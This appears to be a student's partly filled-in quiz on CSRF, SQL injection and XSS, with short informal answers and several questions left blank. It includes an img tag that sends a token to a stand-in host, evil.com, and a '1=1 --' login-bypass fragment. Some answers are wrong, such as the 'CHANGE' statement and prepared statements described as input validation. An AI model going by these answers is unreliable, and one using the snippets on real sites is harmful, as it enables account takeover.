Here is a 25-question open-answer quiz based on the three slidedecks provided.

### Module 1: Cross-Site Request Forgery (CSRF)

**1.** What is the specific behavior of web browsers regarding cookies that allows CSRF attacks to happen?

When going from site A to B, if site A operates with cookies, they are saved in the browser. If site B is evil, then they can create a request (back to A), and since the browser sees that the request is going to A, where it has stored cookies, it attatches them aswell. B can then create a request s.t. that request does some bad stuff (like delete account or add samy is my hero to bio)

**2.** Explain the difference between a "same-site request" and a "cross-site request."

sime-site: request from A.com/1 to A.com/api/get_somthing
cross-site: request from A.com/1 to B.com/something

**3.** In a GET-based CSRF attack, name two HTML tags an attacker can use to trigger a request to a victim's bank without the victim's knowledge.

```html
<img src="evil.com/evil?c=token" /> <iframe src="evil"></iframe>
```

**4.** How does an attacker execute a POST-based CSRF attack without requiring the user to manually click a "Submit" button?

something like this?

```js
window.onload() {do_evil()}
```

or a eventlistener listening to load

**5.** Why is the "Referer" HTTP header considered an unreliable countermeasure against CSRF?

may be spoofed, may be missing, me be misleading.

**6.** How does the "Secret Token" countermeasure prevent an attacker from forging a valid request?

?

**7.** Why can't an attacker's website read the Secret Token from the target website? (Which browser policy prevents this?)

**8.** When using "Same-Site Cookies" as a defense, what is the difference between the `Strict` and `Lax` settings?

strict: no CS requests
lax: only get CS requests (ie. not POST CS requests)

### Module 2: SQL Injection (SQLi)

**9.** What is the fundamental cause of SQL Injection (and other injection vulnerabilities like XSS)?

Lack of sanitation on user input. Users can comment out parts of code and replace logic with things that is always true (e.g. 1=1)

**10.** In a standard SQL query, what is the purpose of the `WHERE` clause?

A logic expression, to find _something_, where that logical expression is true e.g. `WHERE name = "Alice"`

**11.** Why is the predicate `1=1` (or `'1'='1`) frequently used in SQL injection attacks?

cuz its allways true -> can be used to as `password=prob_wrong_input or 1=1 --` which is true regardless if the guessed input is correct or not

**12.** Name two different syntax styles used to create comments in MySQL.

1. `# or --`
2. `/* multiple lines */`

**13.** Explain how an attacker can use an `UPDATE` statement injection to change a user's password in the database.

Makes it possible to change (update) the data:

```sql
CHANGE users SET somethign where case1
```

if case1 can be manipulated, suddenly able to change all

**14.** What is the specific function of `mysqli::real_escape_string()` in PHP?

A sanitation tool, escapes troublesome chars

**15.** Describe the main idea behind "Prepared Statements."

Input validation. All user input is placed correctly, and all user input is checked if are correct (no longer pssible to comment out parsts of the "check")

**16.** When using Prepared Statements, the database receives information via two separate channels. What are they?

1. the expression i.e the sql command e.g. select \* from table where ...
2. the input, ie. what to place in the placeholders

**17.** Why does a Prepared Statement prevent an attacker's input (e.g., `OR '1'='1`) from being executed as code?

The data and the code is sent seperatly. The code (query) is strucured, then the data is placed into the prepared statement. No part of the data is executable, so the string 1=1 is just read as the string s.t. it checks if something == '1=1' (simply put)

### Module 3: Cross-Site Scripting (XSS)

**18.** In an XSS attack, where is the malicious script executed?

On the victims device

**19.** Describe the workflow of a **Stored XSS** attack.

The attacker is able to write mal code on the server/db and is then served to users from there.

**20.** Why is **Reflected XSS** considered "non-persistent"?

**21.** What are the two required components for a **DOM-based XSS** vulnerability to exist?

^^give me a proper explenation on these

**22.** Why are server-side static analysis tools often unable to detect DOM-based XSS vulnerabilities?

Because the mal-code is stored as user-data or in somewhere code issnt supposed to run, therefore shouldnt be needed to checked. The actuall runnign of code is done user-side, and therefore cannot be logged/seen

**23.** In the context of DOM XSS, `document.location.hash` is an example of what?
**24.** In the context of DOM XSS, `document.write()` is an example of what?
**25.** If a developer wants to prevent XSS, they should encode special characters. What does encoding tell the parser to do with those characters?

change them to safe chars e.g. < can be written in a special way with some weird charachter combination, but displayes the same
